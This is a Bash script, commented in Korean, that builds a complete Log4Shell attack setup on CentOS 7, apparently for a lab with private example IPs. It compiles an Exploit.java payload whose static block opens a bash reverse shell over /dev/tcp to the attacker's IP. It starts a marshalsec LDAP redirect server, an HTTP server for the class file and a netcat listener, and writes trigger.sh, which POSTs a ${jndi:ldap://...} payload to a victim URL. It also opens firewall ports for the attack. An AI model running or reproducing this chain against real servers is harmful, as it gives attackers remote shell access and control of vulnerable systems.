#!/bin/bash
# Log4Shell 공격자 환경 세팅 스크립트 (CentOS 7)
# 사용법: sudo ./setup.sh <공격자IP> <피해자URL>
# 예시:   sudo ./setup.sh 192.168.1.100 http://192.168.1.200:8081/logs

set -e

ATTACKER_IP="${1}"
VICTIM_URL="${2:-http://localhost:8081/logs}"

LDAP_PORT=1389
HTTP_PORT=8888
SHELL_PORT=4444

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
info()    { echo -e "${GREEN}[*]${NC} $1"; }
warn()    { echo -e "${YELLOW}[!]${NC} $1"; }
section() { echo -e "\n${RED}[+]${NC} $1"; }

if [ -z "$ATTACKER_IP" ]; then
    echo "사용법: $0 <공격자IP> [피해자URL]"
    echo "예시:   $0 192.168.1.100 http://192.168.1.200:8081/logs"
    exit 1
fi

section "공격자 환경 설치 시작 (CentOS 7)"
info "공격자 IP  : $ATTACKER_IP"
info "피해자 URL : $VICTIM_URL"
info "LDAP 포트  : $LDAP_PORT"
info "HTTP 포트  : $HTTP_PORT"
info "쉘 포트    : $SHELL_PORT"

WORK_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$WORK_DIR"

# ── 1. 의존성 설치 ───────────────────────────────────────────────────
section "의존성 설치 (Java 8, Maven, git, python3, netcat)"

# EPEL 저장소 활성화 (maven, python3 등에 필요)
yum install -y epel-release 2>/dev/null

yum install -y \
    java-1.8.0-openjdk-devel \
    maven \
    git \
    python3 \
    nmap-ncat \
    curl \
    2>/dev/null

info "Java 버전: $(java -version 2>&1 | head -1)"

# Java 8을 기본으로 설정 (여러 버전 설치된 경우)
JAVA8_PATH="$(alternatives --display java 2>/dev/null | grep 'jre-1.8.0-openjdk' | awk '{print $1}' | head -1)"
if [ -n "$JAVA8_PATH" ]; then
    alternatives --set java "$JAVA8_PATH" 2>/dev/null || true
fi

# ── 2. marshalsec 빌드 ──────────────────────────────────────────────
section "marshalsec 빌드 (LDAP 리다이렉트 서버)"

if [ ! -f "marshalsec.jar" ]; then
    if [ ! -d "marshalsec" ]; then
        git clone https://github.com/mbechler/marshalsec.git
    fi
    cd marshalsec
    mvn clean package -q -DskipTests
    cp target/marshalsec-0.0.3-SNAPSHOT-all.jar ../marshalsec.jar
    cd ..
    info "marshalsec.jar 빌드 완료"
else
    info "marshalsec.jar 이미 존재, 스킵"
fi

# ── 3. Exploit.java 작성 및 컴파일 ──────────────────────────────────
section "악성 페이로드 컴파일 (리버스쉘)"

cat > Exploit.java << 'EXPLOIT_EOF'
public class Exploit {
    static {
        try {
            String[] cmd = {
                "/bin/bash", "-c",
                "bash -i >& /dev/tcp/ATTACKER_IP_PLACEHOLDER/SHELL_PORT_PLACEHOLDER 0>&1"
            };
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
EXPLOIT_EOF

# 플레이스홀더 치환
sed -i "s/ATTACKER_IP_PLACEHOLDER/${ATTACKER_IP}/g" Exploit.java
sed -i "s/SHELL_PORT_PLACEHOLDER/${SHELL_PORT}/g" Exploit.java

# Java 8 바이트코드로 컴파일
javac -source 8 -target 8 Exploit.java 2>/dev/null || javac Exploit.java
info "Exploit.class 컴파일 완료"

# ── 4. 실행 스크립트 생성 ────────────────────────────────────────────
section "실행 스크립트 생성"

cat > start_http.sh << EOF
#!/bin/bash
echo "[HTTP] Exploit.class 서버 시작 - 포트 ${HTTP_PORT}"
cd "${WORK_DIR}"
python3 -m http.server ${HTTP_PORT}
EOF

cat > start_ldap.sh << EOF
#!/bin/bash
echo "[LDAP] marshalsec 시작 - 포트 ${LDAP_PORT}"
echo "[LDAP] 콜백 → http://${ATTACKER_IP}:${HTTP_PORT}/#Exploit"
cd "${WORK_DIR}"
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \
    "http://${ATTACKER_IP}:${HTTP_PORT}/#Exploit" ${LDAP_PORT}
EOF

cat > start_listener.sh << EOF
#!/bin/bash
echo "[NC] 리버스쉘 대기 중 - 포트 ${SHELL_PORT}"
nc -lvnp ${SHELL_PORT}
EOF

cat > trigger.sh << EOF
#!/bin/bash
VICTIM_URL="${VICTIM_URL}"
PAYLOAD="\${jndi:ldap://${ATTACKER_IP}:${LDAP_PORT}/exploit}"

echo "[*] 페이로드 전송: \$PAYLOAD"
echo "[*] 대상: \$VICTIM_URL"

curl -s -X POST "\$VICTIM_URL" \\
    -H 'Content-Type: text/plain' \\
    -d "1.2.3.4 - - [\$(date '+%d/%b/%Y:%H:%M:%S %z')] \\"GET / HTTP/1.1\\" 200 512 \\"-\\" \\"\$PAYLOAD\\""

echo ""
echo "[*] 전송 완료 — 리스너 터미널 확인"
EOF

chmod +x start_http.sh start_ldap.sh start_listener.sh trigger.sh

# ── 5. firewalld 포트 오픈 ──────────────────────────────────────────
section "방화벽 포트 오픈 (firewalld)"

if systemctl is-active --quiet firewalld 2>/dev/null; then
    firewall-cmd --permanent --add-port=${LDAP_PORT}/tcp 2>/dev/null && info "firewalld: ${LDAP_PORT}/tcp 오픈"
    firewall-cmd --permanent --add-port=${HTTP_PORT}/tcp 2>/dev/null && info "firewalld: ${HTTP_PORT}/tcp 오픈"
    firewall-cmd --permanent --add-port=${SHELL_PORT}/tcp 2>/dev/null && info "firewalld: ${SHELL_PORT}/tcp 오픈"
    firewall-cmd --reload 2>/dev/null && info "firewalld 규칙 적용 완료"
elif command -v iptables &>/dev/null; then
    iptables -I INPUT -p tcp --dport ${LDAP_PORT} -j ACCEPT && info "iptables: ${LDAP_PORT} 오픈"
    iptables -I INPUT -p tcp --dport ${HTTP_PORT} -j ACCEPT && info "iptables: ${HTTP_PORT} 오픈"
    iptables -I INPUT -p tcp --dport ${SHELL_PORT} -j ACCEPT && info "iptables: ${SHELL_PORT} 오픈"
else
    warn "firewalld/iptables 미설치 — 방화벽 수동 확인 필요"
fi

# ── 완료 ────────────────────────────────────────────────────────────
echo ""
echo -e "${GREEN}=======================================${NC}"
echo -e "${GREEN}  설치 완료${NC}"
echo -e "${GREEN}=======================================${NC}"
echo ""
echo "실행 순서 (터미널 3개):"
echo ""
echo -e "  ${YELLOW}터미널 1${NC} — 리버스쉘 리스너"
echo "  ./start_listener.sh"
echo ""
echo -e "  ${YELLOW}터미널 2${NC} — HTTP 서버 (Exploit.class 서빙)"
echo "  ./start_http.sh"
echo ""
echo -e "  ${YELLOW}터미널 3${NC} — LDAP 서버"
echo "  ./start_ldap.sh"
echo ""
echo -e "  ${YELLOW}터미널 4${NC} — 페이로드 전송"
echo "  ./trigger.sh"
echo ""
echo "페이로드: \${jndi:ldap://${ATTACKER_IP}:${LDAP_PORT}/exploit}"
